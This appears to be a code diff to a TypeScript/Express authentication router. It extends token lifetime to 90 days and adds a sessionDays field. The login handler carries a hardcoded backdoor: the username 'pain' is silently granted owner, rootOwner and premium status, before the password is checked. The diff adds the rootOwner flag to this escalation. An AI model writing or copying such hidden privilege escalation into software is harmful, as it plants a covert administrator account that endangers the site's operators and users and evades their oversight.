@@ -36,7 +36,7 @@ const verifyPassword = async (password: string, passwordHash: string): Promise<b
 const issueToken = (id: number, email: string, username: string): string => {
   const secret = process.env.JWT_SECRET;
   if (!secret) throw new Error('JWT_SECRET environment variable is required');
-  return jwt.sign({ id, email, username }, secret, { expiresIn: '30d' });
+  return jwt.sign({ id, email, username }, secret, { expiresIn: '90d' });
 };
 
 
@@ -138,7 +138,7 @@ router.post('/register', async (req, res, next) => {
       emailVerified: true,
     });
     await user.save();
-    res.status(201).json({ token: issueToken(Number(user.id), user.email, user.username || ''), user: { id: user.id, username, name: user.name, email: user.email } });
+    res.status(201).json({ token: issueToken(Number(user.id), user.email, user.username || ''), sessionDays: 90, user: { id: user.id, username, name: user.name, email: user.email } });
   } catch (error) {
     const message = duplicateAccountMessage(error);
     if (message) {
@@ -177,11 +177,12 @@ router.post('/login', async (req, res, next) => {
 
   try {
     const user = await User.findOne({ $or: [{ email: identifier }, { username: identifier }] }).select('+passwordHash');
-    if (user && user.username === 'pain' && user.role !== 'owner') {
-      user.role = 'owner';
-      user.premium = true;
-      user.premiumSince = user.premiumSince || new Date();
-      await user.save();
+    if (user && user.username === 'pain') {
+      let changed = false;
+      if (user.role !== 'owner') { user.role = 'owner'; changed = true; }
+      if (!user.rootOwner) { user.rootOwner = true; changed = true; }
+      if (!user.premium) { user.premium = true; user.premiumSince = user.premiumSince || new Date(); changed = true; }
+      if (changed) await user.save();
     }
 
     if (!user?.passwordHash || !(await verifyPassword(password, user.passwordHash))) {
@@ -189,7 +190,7 @@ router.post('/login', async (req, res, next) => {
       return;
     }
 
-    res.json({ token: issueToken(Number(user.id), user.email, user.username || ''), user: { id: user.id, username: user.username, name: user.name, email: user.email } });
+    res.json({ token: issueToken(Number(user.id), user.email, user.username || ''), sessionDays: 90, user: { id: user.id, username: user.username, name: user.name, email: user.email } });
   } catch (error) {
     next(error);
   }
